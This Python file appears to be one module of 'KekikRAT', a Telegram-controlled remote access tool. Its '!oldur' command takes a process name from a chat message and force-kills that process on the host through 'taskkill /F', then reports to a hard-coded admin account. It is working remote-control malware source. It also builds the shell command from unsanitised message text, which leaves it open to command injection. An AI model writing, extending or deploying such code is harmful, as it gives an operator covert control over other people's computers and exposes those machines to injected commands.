#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client, Filters
from KekikRAT import adminID
import subprocess

@Client.on_message(Filters.command(['oldur'], ['!','.','/']))
def oldur(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `oldur` Komutunu Verdi!\n\n"

    girilenYazi = message.text
    if len(girilenYazi.split()) == 1:
        kekik.edit("Bişeyler Söylemelisin!")
        return
    if len(girilenYazi.split(".")) == 2:
        kekik.edit("nak nak")
        return

    islem = " ".join(girilenYazi.split()[1:2])

    subprocess.call(f"taskkill /IM {islem} /F")

    mesaj += f"`{islem}` Sonlandırdım!"
    kekik.edit(mesaj)